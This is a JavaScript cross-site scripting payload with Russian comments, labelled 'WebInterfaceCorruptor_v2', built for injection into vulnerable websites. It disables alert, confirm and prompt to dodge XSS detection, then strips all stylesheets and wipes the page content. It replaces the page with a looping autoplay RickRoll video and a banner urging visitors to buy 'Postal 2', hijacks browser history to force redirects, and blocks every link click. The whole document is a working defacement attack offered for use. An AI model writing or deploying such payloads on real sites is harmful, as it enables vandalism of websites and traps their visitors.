// ==/=============================================================\==
// Пейлоад: WebInterfaceCorruptor_v2 (KUSMAN EDITION)
// Вектор: XSS (GET/POST/STORED)
// Функция: Деструкция DOM + Замена контента + Рекламная интеграция
// ==\=============================================================/==

(function() {
    'use strict';

    // --- ЭТАП 1: ПОДАВЛЕНИЕ ПОТЕНЦИАЛЬНОЙ ЗАЩИТЫ ---
    // Блокировка window.alert, если сайт использует её для ловли XSS
    window.alert = function() { return true; };
    window.confirm = function() { return true; };
    window.prompt = function() { return true; };

    // --- ЭТАП 2: ДЕСТРУКЦИЯ СТИЛЕЙ И СТРУКТУРЫ ---
    // Массовое удаление всех элементов <style> и <link rel="stylesheet">
    document.querySelectorAll('style, link[rel="stylesheet"]').forEach(function(el) {
        el.remove();
    });

    // Инлайн-стили для поломки читаемости исходного контента (до полной замены)
    var chaosStyles = document.createElement('style');
    chaosStyles.id = 'chaos__kusman_inline';
    chaosStyles.textContent = `
        * {
            font-family: "Comic Sans MS", cursive, sans-serif !important;
            transform: rotate(0.5deg) !important;
            color: #ff00ff !important;
            background-color: #00ffff !important;
            border: 5px dashed red !important;
            box-sizing: border-box !important;
        }
        img, video, iframe {
            opacity: 0.3 !important;
            filter: blur(2px) hue-rotate(90deg) !important;
        }
    `;
    document.head.appendChild(chaosStyles);

    // --- ЭТАП 3: МАССОВОЕ УДАЛЕНИЕ КОНТЕНТА ---
    // Удаление body и замена его пустым контейнером (прелюдия к RickRoll)
    var originalBody = document.body;
    var newBody = document.createElement('body');
    newBody.id = 'root_kusman_corrupted';
    
    // Очистка старого body
    if (originalBody) {
        while (originalBody.firstChild) {
            originalBody.removeChild(originalBody.firstChild);
        }
    }

    // --- ЭТАП 4: ИНЪЕКЦИЯ RICKROLL ---
    // Внедрение iframe с RickRoll, адаптивный размер под окно браузера
    
    // Контейнер для рикролла
    var rickContainer = document.createElement('div');
    rickContainer.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 90vh; /* Оставляем место для рекламы */
        z-index: 9998;
        background-color: black;
        display: flex;
        justify-content: center;
        align-items: center;
    `;
    
    var rickFrame = document.createElement('iframe');
    rickFrame.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ'; // Автовоспроизведение и зацикливание
    rickFrame.width = '100%';
    rickFrame.height = '100%';
    rickFrame.style.border = 'none';
    rickFrame.allow = 'autoplay; encrypted-media';
    rickFrame.allowFullscreen = true;
    
    rickContainer.appendChild(rickFrame);
    newBody.appendChild(rickContainer);

    // --- ЭТАП 5: ИНЪЕКЦИЯ РЕКЛАМНОГО БЛОКА (ФИНАЛЬНОЕ ТРЕБОВАНИЕ) ---
    var adContainer = document.createElement('div');
    adContainer.style.cssText = `
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 10vh;
        background-color: #ffcc00;
        color: #000;
        font-size: 4vh;
        font-weight: bold;
        font-family: 'Arial Black', sans-serif;
        z-index: 9999;
        display: flex;
        justify-content: center;
        align-items: center;
        text-shadow: 2px 2px 0 #fff;
        border-top: 4px solid red;
    `;

    // Создаем левую часть: "купить постал 2"
    var adTextLeft = document.createElement('span');
    adTextLeft.textContent = 'купить постал 2';
    adTextLeft.style.cssText = 'margin-right: 20px;';

    // Создаем правую часть: "<-- купи постал :)"
    var adTextRight = document.createElement('span');
    adTextRight.innerHTML = '&lt;-- купи постал :)';
    adTextRight.style.cssText = 'color: #000; background-color: #fff; padding: 5px 15px; border-radius: 30px; border: 2px solid #000;';

    // Собираем рекламу
    adContainer.appendChild(adTextLeft);
    adContainer.appendChild(adTextRight);
    
    // Добавляем рекламу в новое body
    newBody.appendChild(adContainer);

    // --- ЭТАП 6: ФИНАЛЬНАЯ ЗАМЕНА ---
    // Замена старого body на новое, полностью измененное
    if (originalBody) {
        originalBody.parentNode.replaceChild(newBody, originalBody);
    } else {
        // Если body не найден (редкий случай), создаем его с нуля
        document.documentElement.appendChild(newBody);
    }

    // --- ЭТАП 7: ДОПОЛНИТЕЛЬНАЯ СТАБИЛЬНОСТЬ (ПОЛОМКА НАВИГАЦИИ) ---
    // Переопределение истории браузера, чтобы пользователь не мог уйти назад
    try {
        window.history.pushState = function() { 
            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
        };
        window.history.replaceState = function() { 
            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
        };
    } catch (e) {
        // Игнорируем ошибки переопределения
    }

    // Блокировка кликов по ссылкам
    document.addEventListener('click', function(event) {
        event.preventDefault();
        event.stopPropagation();
        return false;
    }, true);

})();
